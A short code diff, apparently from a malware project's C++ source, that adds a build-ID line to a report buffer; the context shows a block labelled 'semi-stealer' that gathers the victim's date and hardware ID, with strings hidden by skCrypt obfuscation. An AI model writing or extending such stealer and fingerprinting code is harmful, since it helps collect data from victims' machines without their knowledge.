@@ -112,6 +112,8 @@ int main(int argc, char* argv[]) {
     key = "";
     iv = "";
 
+    info_txt += (string)skCrypt("Build ID: ") + BUILD_ID + (string)skCrypt("\n");
+
 #if STEAL_INFO   // semi-stealer
     info_txt += (string)skCrypt("Date: ") + GetDate() + (string)skCrypt("\n");
     info_txt += (string)skCrypt("HWID: ") + GetHWID() + (string)skCrypt("\n");
